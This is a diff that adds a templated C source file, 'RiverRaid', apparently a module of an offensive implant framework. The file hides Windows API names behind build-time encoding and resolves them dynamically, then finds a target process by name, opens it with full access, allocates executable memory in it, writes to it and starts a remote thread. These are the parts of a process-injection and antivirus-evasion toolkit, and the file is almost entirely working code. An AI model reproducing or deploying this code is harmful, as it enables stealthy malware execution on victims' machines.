@@ -1,0 +1,209 @@
+#!name##RiverRaid_C
+#!itemType##sfile
+#!info##River Raid C file.
+#!lang##c
+#!addNameComp##True
+
+{% set CHIP_AND_DALE_ENCODE_KEY = shTOOL.DaleBuildKey(CAD_eKEY) %}
+
+
+#include "river_raid.h"
+#include <stdio.h>
+#include <string.h>
+
+#define RIVER_RAID_PID_LIST_SIZE 2048
+#define RIVER_RAID_NAME_SIZE 128
+
+// NAMES
+char river_RAW_NAME_PSAPI_DLL[] = {
+    {{ shTOOL.DaleShadow("Psapi.dll", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_EnumProcesses[] = {
+    {{ shTOOL.DaleShadow("EnumProcesses", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_NtOpenProcess[] = {
+    {{ shTOOL.DaleShadow("NtOpenProcess", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_NtClose[] = {
+    {{ shTOOL.DaleShadow("NtClose", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_GetModuleBaseNameA[] = {
+    {{ shTOOL.DaleShadow("GetModuleBaseNameA", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_NtAllocateVirtualMemory[] = {
+    {{ shTOOL.DaleShadow("NtAllocateVirtualMemory", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_NtWriteVirtualMemory[] = {
+    {{ shTOOL.DaleShadow("NtWriteVirtualMemory", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_NtCreateThreadEx[] = {
+    {{ shTOOL.DaleShadow("NtCreateThreadEx", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_GetTempPathA[] = {
+    {{ shTOOL.DaleShadow("GetTempPathA", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_Shlwapi_DLL[] = {
+    {{ shTOOL.DaleShadow("Shlwapi.dll", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+char river_RAW_NAME_PathCombineA[] = {
+    {{ shTOOL.DaleShadow("PathCombineA", CHIP_AND_DALE_ENCODE_KEY) }}
+};
+
+// Psapi.dll addr
+void *river_ADDR_PSAPI_DLL = NULL;
+
+// Shlwapi.dll addr
+void *river_ADDR_SHLWAPI_DLL = NULL;
+
+// types
+typedef NTSTATUS (*river_faddrNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+typedef NTSTATUS (*river_faddrNtClose)(HANDLE);
+typedef DWORD (*river_faddrGetModuleBaseNameA)(HANDLE, HMODULE, LPSTR, DWORD);
+typedef NTSTATUS (*river_faddrNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (*river_faddrNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T);
+typedef NTSTATUS (*river_faddrNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef DWORD (*river_faddrGetTempPathA)(DWORD, LPSTR);
+typedef LPSTR (*river_faddrPathCombineA)(LPSTR, LPCSTR, LPCSTR);
+
+// buffers etc
+static OBJECT_ATTRIBUTES river_TEMP_OBJ_ATT;
+static CLIENT_ID river_TEMP_CLIENT_ID;
+static DWORD river_TEMP_PID_LIST[RIVER_RAID_PID_LIST_SIZE];
+static char river_TEMP_PROCESS_NAME[RIVER_RAID_NAME_SIZE];
+
+
+// Var, address
+static river_faddrNtClose river_ADDR_NtClose;
+static river_faddrGetModuleBaseNameA river_ADDR_GetModuleBaseNameA;
+static river_faddrNtAllocateVirtualMemory river_RAW_F_NtAllocateVirtualMemory;
+
+static void river_rf_get_psapi(void) {
+    HMODULE psapi;
+    // CDFwx_LdrLoadDll(river_RAW_NAME_PSAPI_DLL, &psapi);
+    psapi = CDFwe_LoadLibraryA(river_RAW_NAME_PSAPI_DLL);
+    river_ADDR_PSAPI_DLL = psapi;
+}
+
+static void river_rf_get_shlwapi(void) {
+    HMODULE sapi;
+    // CDFwx_LdrLoadDll(river_RAW_NAME_Shlwapi_DLL, &sapi);
+    sapi = CDFwe_LoadLibraryA(river_RAW_NAME_Shlwapi_DLL);
+    river_ADDR_SHLWAPI_DLL = sapi;
+}
+
+
+void RiverRaidInit(void) {
+    river_rf_get_psapi();
+    river_rf_get_shlwapi();
+    river_ADDR_NtClose = CDF_GetFuncEnc(river_RAW_NAME_NtClose, CDV_ADDR_NTDLL);
+    river_ADDR_GetModuleBaseNameA = CDF_GetFuncEnc(river_RAW_NAME_GetModuleBaseNameA, river_ADDR_PSAPI_DLL);
+    river_RAW_F_NtAllocateVirtualMemory = CDF_GetFuncEnc(river_RAW_NAME_NtAllocateVirtualMemory, CDV_ADDR_NTDLL);
+}
+
+BOOL raid_EnumProc(DWORD pidList[], DWORD size, LPDWORD retBytes) {
+    void *addrEP = CDF_GetFuncEnc(river_RAW_NAME_EnumProcesses, river_ADDR_PSAPI_DLL);
+    BOOL (*enProc)(DWORD[], DWORD, LPDWORD) = addrEP;
+    return enProc(pidList, size, retBytes);
+}
+
+HANDLE raid_OpenProcInfo(DWORD pid) {
+    river_faddrNtOpenProcess oNtProc = CDF_GetFuncEnc(river_RAW_NAME_NtOpenProcess, CDV_ADDR_NTDLL);
+    RRM_InitializeObjectAttributes(&river_TEMP_OBJ_ATT, NULL, 0, NULL, NULL);
+    HANDLE hProc;
+    river_TEMP_CLIENT_ID.UniqueProcess = (PVOID)(uintptr_t)pid;
+    river_TEMP_CLIENT_ID.UniqueThread = 0;
+    NTSTATUS result = oNtProc(&hProc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &river_TEMP_OBJ_ATT, &river_TEMP_CLIENT_ID);
+    if (result != 0) {
+        return 0;
+    }
+    else {
+        return hProc;
+    }
+
+}
+
+HANDLE raid_OpenProcFull(DWORD pid) {
+    river_faddrNtOpenProcess oNtProc = CDF_GetFuncEnc(river_RAW_NAME_NtOpenProcess, CDV_ADDR_NTDLL);
+    RRM_InitializeObjectAttributes(&river_TEMP_OBJ_ATT, NULL, 0, NULL, NULL);
+    HANDLE hProc;
+    river_TEMP_CLIENT_ID.UniqueProcess = (PVOID)(uintptr_t)pid;
+    river_TEMP_CLIENT_ID.UniqueThread = 0;
+    NTSTATUS result = oNtProc(&hProc, PROCESS_ALL_ACCESS, &river_TEMP_OBJ_ATT, &river_TEMP_CLIENT_ID);
+    if (result != 0) {
+        return 0;
+    }
+    else {
+        return hProc;
+    }
+}
+
+NTSTATUS raid_CloseHandle(HANDLE procHandle) {
+    return river_ADDR_NtClose(procHandle);
+}
+
+DWORD raid_GetModuleBaseNameA(HANDLE hproc, HMODULE mhand, LPSTR buff, DWORD buff_size) {
+    return river_ADDR_GetModuleBaseNameA(hproc, mhand, buff, buff_size);
+}
+
+BOOL river_GetProcName(DWORD pid) {
+    HANDLE hproc = raid_OpenProcInfo(pid);
+    if (hproc != 0) {
+        raid_GetModuleBaseNameA(hproc, 0, river_TEMP_PROCESS_NAME, RIVER_RAID_NAME_SIZE);
+        raid_CloseHandle(hproc);
+        return 1;
+    }
+    return 0;
+}
+
+DWORD raid_FindProcessPID(char proc_name[]) {
+    // clear PID list
+    memset(river_TEMP_PID_LIST, 0, RIVER_RAID_PID_LIST_SIZE);
+    // clear buff name
+    memset(river_TEMP_PROCESS_NAME, 0, RIVER_RAID_NAME_SIZE);
+    DWORD retByt;
+    raid_EnumProc(river_TEMP_PID_LIST, RIVER_RAID_PID_LIST_SIZE, &retByt);
+    for (int i=0;i<RIVER_RAID_PID_LIST_SIZE;i++) {
+        if (river_TEMP_PID_LIST[i] == 0 & river_TEMP_PID_LIST[i+1] == 0) {
+            break;
+        }
+        BOOL rpn = river_GetProcName(river_TEMP_PID_LIST[i]);
+        if (rpn == 0) {
+            continue;
+        }
+        if (strcmp(river_TEMP_PROCESS_NAME, proc_name) == 0) {
+            return river_TEMP_PID_LIST[i];
+        }
+
+    }
+    return 0;
+}
+
+NTSTATUS raid_AllocMemory(HANDLE proc_handle, PVOID mem_addr, PSIZE_T mem_size) {
+    return river_RAW_F_NtAllocateVirtualMemory(proc_handle, mem_addr, 0, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+}
+
+NTSTATUS raid_AllocMemoryWrite(HANDLE proc_handle, PVOID mem_addr, PSIZE_T mem_size) {
+    return river_RAW_F_NtAllocateVirtualMemory(proc_handle, mem_addr, 0, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+}
+
+NTSTATUS raid_WriteMemory(HANDLE proc_handle, PVOID base_addr, PVOID buffer, SIZE_T byte_size) {
+    river_faddrNtWriteVirtualMemory NtWrite = CDF_GetFuncEnc(river_RAW_NAME_NtWriteVirtualMemory, CDV_ADDR_NTDLL);
+    return NtWrite(proc_handle, base_addr, buffer, byte_size, 0);
+
+}
+
+
+NTSTATUS raid_CreateTh(PHANDLE th_handle, HANDLE proc_handle, PVOID start_func, PVOID func_args) {
+    river_faddrNtCreateThreadEx crTH = CDF_GetFuncEnc(river_RAW_NAME_NtCreateThreadEx, CDV_ADDR_NTDLL);
+    return crTH(th_handle, THREAD_ALL_ACCESS, 0, proc_handle, start_func, func_args, 0, 0, 0, 0, 0);
+}
+
+DWORD raid_GetTempDirPath(LPSTR buffer, DWORD buff_size) {
+    river_faddrGetTempPathA temp_path = CDF_GetFuncEnc(river_RAW_NAME_GetTempPathA, CDV_ADDR_KERNEL32);
+    return temp_path(buff_size, buffer);
+}
+
+LPSTR raid_MergePath(LPSTR dest_buff, LPCSTR dir_name, LPCSTR file_name) {
+    river_faddrPathCombineA path_combine = CDF_GetFuncEnc(river_RAW_NAME_PathCombineA, river_ADDR_SHLWAPI_DLL);
+    return path_combine(dest_buff, dir_name, file_name);
+}
